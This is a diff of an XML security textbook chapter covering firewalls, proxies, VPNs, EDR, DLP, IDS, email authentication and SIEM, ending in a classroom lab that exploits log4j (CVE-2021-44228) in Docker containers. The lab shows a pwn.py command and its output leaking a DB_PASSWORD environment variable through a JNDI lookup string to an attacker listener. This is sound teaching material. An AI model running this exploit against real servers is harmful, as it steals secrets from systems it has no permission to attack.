@@ -9,205 +9,164 @@
 			</p>
   </introduction>
 
-				<section xml:id="false-positives-negatives-_false_positives_negatives">
-					<title>6.1. False Positives / Negatives {#_false_positives_negatives}</title>
-					<!-- div attr= class="paragraph"-->
+				<section xml:id="false-positives-negatives">
+					<title>6.1. False Positives / Negatives</title>
+
 					<p>
 					When a security solution detects a threat, but no threat exists, that is a 
 						<em>false positive</em>. Depending on the complexity of the solution it may utilize a set of rules, indicators of compromise, or possibly even artificial intelligence to trigger its warning system. In the case of a solution that creates a lot of false positives, it can be tiring for a team to go through each alert. Eventually teams are conditioned to ignore the alerts, making the security solution useless.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					The key to lowering the false positive rate of a system is to better tune the rule set used to trigger the warnings. A security team may spend time determining a baseline of events and looking for abnormalities that correspond to actual attacks. This information can then be used to build a better detection system.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="exampleblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					Example 6. Webroot Antivirus
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 						<url href="https://www.nbcnews.com/tech/tech-news/popular-antivirus-program-mistakenly-ids-windows-threat-creating-chaos-n750521">In 2017 a popular antivirus service created a bad rule that identified certain Windows operating system files as threats.</url> The antivirus solution quarantined these files, which were critical for the operation of the machine. The result was a machine that was unusable.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					For 13 minutes, Webroot distributed this rule to its antivirus software shutting down operations on an untold number of machines. Fortunately Webroot was able to quickly identify the problem and send out an update which would have allowed the machines to automatically fix the problem. Unfortunately their infrastructure for distributing the update quickly became overloaded.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="exampleblock">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					When a security solution fails to identify a threat, this is known as a 
 						<em>false negative</em>. While no solution can ever be 100% effective, false negatives can undermine confidence in a product. False negatives may be resolved by a skilled SOC team, closely monitoring what is happening. It is also possible to address false negatives through 
 						<em>Layered Security</em> a concept that we will cover next.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+
 				</section>
-				<section xml:id="layered-security-_layered_security">
-					<title>6.2. Layered Security {#_layered_security}</title>
-					<!-- div attr= class="imageblock left"-->
-					<!-- div attr= class="content"-->
+				<section xml:id="layered-security">
+					<title>6.2. Layered Security</title>
+
 					<figure>
 						<image source="layers.svg"/>
 						<caption>layers</caption>
 					</figure>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="imageblock left">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Given that a single security solution is never 100% effective it makes sense to approach security in layers and use multiple systems. There is often a lot of overlap between solutions and while that may seem inefficient in other fields, in cybersecurity we consider it a benefit. By using multiple solutions, sometimes referred to as multi-layered security or defense in depth, you can build a more robust protection against breaches.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Let’s take a look at an example to see how layered security can help mitigate the effects of a real-world attack. Assume an SOC is supporting a web application on self-hosted machines. A malicious actor wishes to exfiltrate data from the web application. They begin by testing to see if SQL several different SQL injection attacks yield any results.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					A well designed web application should sanitize its inputs and may prevent the queries from making it to the database. Similarly an alert team may notice a sudden uptick in SQL queries, far beyond the usual baseline for the application. An IDS (Intrusion Detection System) may flag the queries as known SQL injection attacks. Assuming the attack makes it past the application, team, and the IDS, it is possible that the database user is configured according to the principle of least privilege and the queries will not be executed due to a lack of permissions.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					As you can see, any one of these layers may be fail, but by having multiple layers the chance of an attack occurring is greatly diminished.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+
 				</section>
-				<section xml:id="network-solutions-_network_solutions">
-					<title>6.3. Network Solutions {#_network_solutions}</title>
-					<!-- div attr= class="paragraph"-->
+				<section xml:id="network-solutions">
+					<title>6.3. Network Solutions</title>
+
 					<p>
 					Many products are available for handling network traffic. They are typically marketed as either stand-alone devices, software to install on internal devices, or a subscription service that routes traffic through an external appliance. In the age of cloud computing network security as a service is becoming increasingly popular.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="sect3"-->
-					<paragraphs xml:id="firewall-_firewall">
-						<title>6.3.1. Firewall {#_firewall}</title>
-						<!-- div attr= class="paragraph"-->
+
+					<paragraphs xml:id="firewall">
+						<title>6.3.1. Firewall</title>
+
 						<p>
 						A firewall is a service/software/device that blocks unwanted traffic and permits wanted traffic. Typically a firewall is a barrier between and private network and the Internet.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Software like 
 							<url href="https://wiki.nftables.org/wiki-nftables/index.php/Main_Page">nftables</url> can be used to build a firewall on a Linux router for many interior clients. Interior clients may also run host-based firewalls such as 
 							<url href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security">Windows Defender Firewall</url>. Finally hardware solutions for plug-in firewall devices are available from many vendors including Palo Alto and Cisco. Any combination of these solutions may be used.
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Firewalls typically employ rules regarding which packets can come in and how to handle them. For example a firewall may have a rule to 
 							<c>ALLOW</c> packets from exterior hosts connecting on port 22. This would allow SSH connections. Likewise a firewall may have a rule to track internal to external connection requests and perform network address translation (NAT). On an IPv4 network it is common to have a firewall also perform NAT.
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Next-Gen Firewalls (NGFW) perform the same functions of a standard firewall, but also employ an integrated intrusion prevention system (IPS) to mitigate threats. The firewall is a perfect place to perform these actions as it can easily close of connections. NGFW often tout artificial intelligence threat monitoring and automatic threat intelligence updating (typically updating attack signatures). A NGFW can also easily be built on a Linux device by making use of 
 							<url href="https://www.snort.org/">an IPS</url> in conjunction with a netfilter firewall.
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Network infrastructure may also make use of a special space 
 							<em>outside</em> of a firewall called the Demilitarized Zone (DMZ). Servers that need to be directly connected to the Internet are often put in the DMZ so they don’t have a deal with restrictive firewall rules. These servers may be used to detect malicious activity, monitor incoming traffic, or to handle basic requests such as serving static web pages.
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						The largest firewall in the world is the Chinese Great Firewall, started in 1998 as a way to prevent outside influence in China. It is a system used to block IPs, hijack DNS queries, throttle traffic, and perform MitM decryption. The Great Firewall is made of proxies and firewalls performing packet-inspection and content filtering. VPNs are often employed within China to circumvent the great firewall and the great firewall is continually updated to attempt to detect and shut down this traffic.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
-					<paragraphs xml:id="proxy-_proxy">
-						<title>6.3.2. Proxy {#_proxy}</title>
-						<!-- div attr= class="imageblock right"-->
-						<!-- div attr= class="content"-->
+					<paragraphs xml:id="proxy">
+						<title>6.3.2. Proxy</title>
+
 						<figure>
 							<image source="tls-proxy.svg"/>
 							<caption>tls proxy</caption>
 						</figure>
-						<!--</div attr= class="content">-->
-						<!--</div attr= class="imageblock right">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						A proxy typically sits between the users and an external network. Proxies and receive and send requests on behalf of a user, allowing for full control over the traffic going out and coming back in.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Proxies can be used for caching, access control, URL filtering, content scanning, and even packet inspection. Proxy solutions may be explicit or transparent and are offered by many companies including McAfee, Fortigate, Netsparker, and Palo Alto. A typical application of a proxy would be to filter explicit content on a school district network.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Proxies can also be broken into 
 							<em>forward</em> and 
 							<em>reverse</em> configurations. A forward proxy passes requests from a private or internal network to the internet. Forward proxies can speed up local requests through caching and validate that the request should be performed. Forward proxies are interoperable with standard firewalls and network address translation (NAT).
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Reverse proxies take requests from an external source and pass it to an internal service. This helps prevent clients from having direct access to internal services. Reverse proxies can utilize caching and validate requests as well. A reverse proxy can also be configured to work with a firewall. Whereas it used to be common practice to place a server in a demilitarized zone (DMZ) outside of a firewall, it is now far more common to employ a reverse proxy to reach that server.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
-					<paragraphs xml:id="load-balancer-_load_balancer">
-						<title>6.3.3. Load Balancer {#_load_balancer}</title>
-						<!-- div attr= class="paragraph"-->
+					<paragraphs xml:id="load-balancer">
+						<title>6.3.3. Load Balancer</title>
+
 						<p>
 						A common application for reverse proxies is to act as a load balancer for traffic. Load balancers distribute work, in the form of external client requests, among the internal resources, typically servers.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						For example, if a company has four servers supporting a web application, they may employ a reverse proxy load balancer that takes requests from clients and passes that request to one of the four internal servers. Different metrics are used to determine how the servers are utilized including least used (round robin), weighted, least amount of active connections. Load balancers optimize bandwidth and increase availability.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
-					<paragraphs xml:id="vpn-_vpn">
-						<title>6.3.4. VPN {#_vpn}</title>
-						<!-- div attr= class="paragraph"-->
+					<paragraphs xml:id="vpn">
+						<title>6.3.4. VPN</title>
+
 						<p>
 						A virtual private network (VPN) is used to encrypt internet traffic between two networks or a client and a network. VPNs have become standard procedure for linking remote offices or connecting remote workers. Given the growth of working from home, almost all users have become familiar with what a VPN is and what it does.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Site-to-site VPNs are typically used for linking offices together. This kind of VPN is on permanently. An example would be linking two college campuses: NJIT Newark and NJIT Jersey City. In this scenario users on either campus expect to be able to connect securely to services on the opposite campus at all times. The traffic is encrypted and carried over the Internet.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Remote access VPNs are used by individuals connecting in to a secure network. This kind of VPN is usually stated through a application such as Cisco AnyConnect. When the application is running the user is able to securely access internal resources as if they were at the office.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Many vendors offer VPN products including Cisco, Citrix, Fortinet, Palo Alto, and Checkpoint. Many open source options also exist for building VPNs including 
 							<url href="https://openvpn.net/">OpenVPN</url>, 
@@ -215,160 +174,123 @@
 							<url href="https://linuxhint.com/how-to-implement-ipsec-in-linux/">IPsec</url>.
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
 					<paragraphs xml:id="tap-_tap">
-						<title>6.3.5. TAP {#_tap}</title>
-						<!-- div attr= class="paragraph"-->
+						<title>6.3.5. TAP</title>
+
 						<p>
 						Sometimes it is necessary for a network or security engineer to monitor what is happening on a particular network segment. In this case a network terminal access point (TAP) can be employed. A TAP creates a copy of network traffic and forwards it to a particular port on a switch or router.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!--</div attr= class="sect2">-->
-						<!-- div attr= class="sect2"-->
+
 					</paragraphs>
 				</section>
-				<section xml:id="edr-_edr">
-					<title>6.4. EDR {#_edr}</title>
-					<!-- div attr= class="paragraph"-->
+				<section xml:id="edr">
+					<title>6.4. EDR</title>
+
 					<p>
 					Endpoint Detection and Response (EDR) is used to secure endpoints: servers, workstations, desktops, mobile devices, etc. EDR is typically implemented as a host-based incident prevention system (HBIPS), software that runs on the endpoint to monitor and collect data.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					These systems will usually watch for indicators of compromise, scan for malware, and can even quarantine or shutdown the endpoint as needed. Company hardware is a significant investment for any business and an EDR makes sure that investment is protected. Many systems exist for EDR including FireEye, SEP, and CrowdStrike.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+
 				</section>
-				<section xml:id="data-loss-prevention-_data_loss_prevention">
-					<title>6.5. Data Loss Prevention {#_data_loss_prevention}</title>
-					<!-- div attr= class="paragraph"-->
+				<section xml:id="data-loss-prevention">
+					<title>6.5. Data Loss Prevention</title>
+
 					<p>
 					Data loss prevention (DLP) solutions aim to stop the exfiltration of sensitive data. This could be personally identifying information (PI), medical records, social security numbers (SSNs), credit card numbers, etc. Typically DLP either functions on the endpoint and server, data at rest, or on the network, data in motion.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Network DLP solutions may monitor emails or web traffic for sensitive strings, such as SSNs. When an SSN is detecting in an email, the email is quarantined and an alert is sent. Server and endpoint DLP solutions may periodically scan the system to see if sensitive strings are stored on the system. If it is a system that shouldn’t have access to sensitive data an alert is sent. DLP on an endpoint may also limit tasks like USB usage or bulk data transmitting.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+
 				</section>
-				<section xml:id="idsips-_idsips">
-					<title>6.6. IDS/IPS {#_idsips}</title>
-					<!-- div attr= class="paragraph"-->
+				<section xml:id="idsips">
+					<title>6.6. IDS/IPS</title>
+
 					<p>
 					Intrusion Detection Systems and Intrusion Prevention Systems are systems that monitor network traffic to detect/prevent attacks. These systems may look for known exploits, such as SQL injection patterns, in the traffic and trigger an alert when detected. An intrusion 
 						<em>prevention</em> system will take it one step further and actually shut down the connection or kill the offending process.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					These systems employ exploit signatures or IDs that are indicators of compromise (IoCs), anomalies, or strange behaviors. The power of an IDS/IPS often comes from how up-to-date it’s signature database is. There are many solutions in the category including Splunk, QRadar, CrowdStrike, and SolarWinds.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+
 				</section>
-				<section xml:id="email-solutions-_email_solutions">
-					<title>6.7. Email Solutions {#_email_solutions}</title>
-					<!-- div attr= class="paragraph"-->
+				<section xml:id="email-solutions">
+					<title>6.7. Email Solutions</title>
+	
 					<p>
-					The original protocols used to send/receive email were simple and not designed for the challenges we face today. SPAM and phishing emails are unfortunately common and can be addressed with email client add-ons that scan for viruses or use patterns to identify phishing emails. Many of these tools are already built into Google’s GMail or Microsofts Exchange.
+					The original protocols used to send/receive email were simple and not designed for the challenges we face today. SPAM and phishing emails are unfortunately common and can be addressed with email client add-ons that scan for viruses or use patterns to identify phishing emails. Many of these tools are already built into Google’s GMail or Microsoft's Exchange.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Another large challenge is verifying the sender of an email. Currently three common methods exist: Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-base Message Authentication, Reporting, and Conformance (DMARC).
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					SPF utilizes TXT records on a DNS domain to verify the IP of a sender. When inbound mail is received, the SPF information for the domain of the sender is retrieved, giving an allowed list of IPs. For example, NJIT’s SPF record currently looks like this:
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="content"-->
+
 					<pre>v=spf1 ip4:128.235.251.0/24 ip4:128.235.209.0/24 ip4:66.207.100.96/27 ip4:66.207.98.32/27 ip4:205.139.104.0/22 ip4:206.79.6.0/24 ip4:209.235.101.208/28 ip4:216.185.73.96/27 ip4:69.196.241.0/28 ip4:69.196.242.128/28 ip4:46.183.242.192/28 ip4:202.38.144.192/28 ip4:69.196.236.208/28 ip4:103.225.232.128/28 ip4:37.216.222.128/28 ip4:64.125.200.96/28 ip4:74.217.49.0/25 ip4:69.25.227.128/25 ip4:52.45.50.190 ip4:198.187.196.100 include:_netblock.njit.edu include:spf.sparkmail.org ~all</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					It is important to note that not all of these IPs belong to NJIT. Some may be groups that send emails on NJIT’s behalf like mass mailers, web applications, etc. When properly configured SPF prevents an attacker from impersonating emails from a domain.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					DKIM utilizes public and private key cryptography to ensure that an email originated from a particular SMTP server. Public keys for a domain are advertised through a TXT DNS record for a particular domain. Private keys are used by the SMTP server for that domain to sign the emails being sent. A receiving SMTP server can then verify that the message originated from a valid SMTP server for that domain. Private keys can also be distributed to SMTP servers that send emails on behalf of the domain.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					DMARC applies policies to the SPF and DKIM validations. DMARC answers questions like, "What should I do if a message is from a valid SPF IP but doesn’t have a valid DKIM signature?" or "What should I do with a message that looks like SPAM but has a valid DKIM signature?" DMARC puts many of the tools used to verify email together in a layered approach to determine whether to pass, quarantine, or block an email.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+	
 				</section>
-				<section xml:id="siem-_siem">
-					<title>6.8. SIEM {#_siem}</title>
-					<!-- div attr= class="openblock float-group"-->
-					<!-- div attr= class="content"-->
-					<!-- div attr= class="imageblock right"-->
-					<!-- div attr= class="content"-->
+				<section xml:id="siem">
+					<title>6.8. SIEM</title>
+
 					<figure>
 						<image source="seim.svg"/>
 						<caption>seim</caption>
 					</figure>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="imageblock right">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Security and Information Event management is a system for real-time monitoring of security information. Typically a SIEM system presents a dashboard showing events and has the ability to generate reports or create tickets. It may be separate device, software on an internal device, or even a third party service. Some examples of popular SIEMs are QRadar, Splunk, and Azure Sentinel.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="openblock float-group">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+
 				</section>
 				<section xml:id="lab-exploiting-log4j">
 					<title>6.9. Lab: Exploiting log4j</title>
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					In this lab we will examine the log4j vulnerability, 
 						<url href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</url>. This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file. This file can contain any code that the attacker wishes to inject into the server process.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="admonitionblock important deliverable"-->
+				<question>
 					<p>
-					+———————————–+———————————–+ | | ::: {.paragraph} | | | Do some research: What versions | | | of log4j are affected by this | | | vulnerability? | | | ::: | +———————————–+———————————–+
+					Do some research: What versions of log4j are affected by this vulnerability?
 				</p>
-					<!--</div attr= class="admonitionblock important deliverable">-->
-					<!-- div attr= class="paragraph"-->
+			</question>
+
 					<p>
 					This lab uses a Docker Compose configuration to simulate a network with an attacker and a target. The target runs a 
 						<url href="https://github.com/leonjza/log4jpwn">known-vulnerable, example application</url> written by leonjza. This example application logs the 
 						<c>User-Agent</c> header, request path, and a query string parameter of a request as seen below:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					App.java
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>package com.sensepost.log4jpwn;
 
 import org.apache.logging.log4j.Logger;
@@ -402,14 +324,12 @@ public class App {
         });
     }
 }</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="admonitionblock important deliverable"-->
+					<question>
 					<p>
-					+———————————–+———————————–+ | | ::: {.paragraph} | | | What port does our vulnerable app | | | run on? | | | ::: | +———————————–+———————————–+
+					What port does our vulnerable app run on?
 				</p>
-					<!--</div attr= class="admonitionblock important deliverable">-->
-					<!-- div attr= class="paragraph"-->
+				</question>
+
 					<p>
 					Our attacker container has 
 						<url href="https://github.com/leonjza/log4jpwn/blob/master/pwn.py">the 
@@ -417,8 +337,7 @@ public class App {
 						</url>, also by leonjza, which does two things:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="olist arabic"-->
+
 					<p>
 						<ol>
 							<li>
@@ -438,24 +357,20 @@ public class App {
 							</li>
 						</ol>
 					</p>
-					<!--</div attr= class="olist arabic">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Using this setup we can show how log4j can be used to leak sensitive information from running processes. We will use it to leak the value of the environment variable 
 						<c>DB_PASSWORD</c>. As it isn’t uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Start by downloading 
 						<url href="https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true">the zip archive of this lab</url> and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you’ve done that, you can bring the lab up by typing 
 						<c>docker-compose up</c> in that directory. Output should look similar to what you see below:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="content"-->
+
 					<pre>PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose up
 [+] Running 2/0
  - Container log4j-target-1    Created                                                            0.0s
@@ -472,9 +387,7 @@ log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No Sessio
 log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
 log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
 log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					You’ll notice that the 
 						<c>target</c> service is up and running the 
@@ -483,14 +396,10 @@ log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @9
 						<c>docker-compose run attacker bash</c>. This will be the shell that you use to attack the target:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="content"-->
+
 					<pre>PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose run attacker bash
 root@3971c61303c8:/(1)</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					<table>
 						<title></title>
 						<tabular>
@@ -502,8 +411,7 @@ root@3971c61303c8:/(1)</pre>
 							</row>
 						</tabular>
 					</table>
-					<!--</div attr= class="colist arabic">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					In the attack shell, use the 
 						<c>ip</c> command to determine the IPv4 address of your container. We will need this since the 
@@ -511,17 +419,13 @@ root@3971c61303c8:/(1)</pre>
 						<c>target</c> once the exploit string is logged.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="content"-->
+
 					<pre>root@3971c61303c8:/# ip addr show dev eth0
 58: eth0@if59: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
     link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet &lt;IP_ADDRESS&gt;/16 brd 172.20.255.255 scope global eth0 (1)
        valid_lft forever preferred_lft forever</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					<table>
 						<title></title>
 						<tabular>
@@ -536,8 +440,7 @@ root@3971c61303c8:/(1)</pre>
 							</row>
 						</tabular>
 					</table>
-					<!--</div attr= class="colist arabic">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Once you have the IP address, you can run the 
 						<c>pwn.py</c> script on the 
@@ -546,9 +449,7 @@ root@3971c61303c8:/(1)</pre>
 						<c>target</c> container.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="content"-->
+
 					<pre>root@3971c61303c8:/# python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak '${env:DB_PASSWORD}' (1)
  i| starting server on &lt;IP_ADDRESS&gt;:8888
  i| server started
@@ -558,9 +459,7 @@ root@3971c61303c8:/(1)</pre>
  v| extracted value: &lt;DB_PASSWORD&gt; (2)
  i| request url was: http://target:8080/
  i| response status code: 200</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					<table>
 						<title></title>
 						<tabular>
@@ -580,19 +479,17 @@ root@3971c61303c8:/(1)</pre>
 							</row>
 						</tabular>
 					</table>
-					<!--</div attr= class="colist arabic">-->
-					<!-- div attr= class="admonitionblock important deliverable"-->
+					<question>
 					<p>
-					+———————————–+———————————–+ | | ::: {.paragraph} | | | What is the database password? | | | ::: | +———————————–+———————————–+
+					What is the database password?
 				</p>
-					<!--</div attr= class="admonitionblock important deliverable">-->
-					<!-- div attr= class="admonitionblock important deliverable"-->
+			</question>
+			<question>
 					<p>
-					+———————————–+———————————–+ | | ::: {.paragraph} | | | What steps would you take to | | | mitigate the risk of a deployed | | | application having this | | | vulnerability? | | | ::: | +———————————–+———————————–+
+					What steps would you take to mitigate the risk of a deployed application having this vulnerability?
 				</p>
-					<!--</div attr= class="admonitionblock important deliverable">-->
-					<!--</div attr= class="sect2">-->
-					<!-- div attr= class="sect2"-->
+				</question>
+
 				</section>
 				<section xml:id="security-solutions-review">
 					<title>6.10. Review Questions</title>
@@ -616,11 +513,7 @@ root@3971c61303c8:/(1)</pre>
 							</li>
 						</ol>
 					</p>
-					<!--</div attr= class="qlist qanda">-->
-					<!--</div attr= class="sect2">-->
-					<!--</div attr= class="sectionbody">-->
-					<!--</div attr= class="sect1">-->
-					<!-- div attr= class="sect1"-->
+
 				</section>
 
 </chapter>
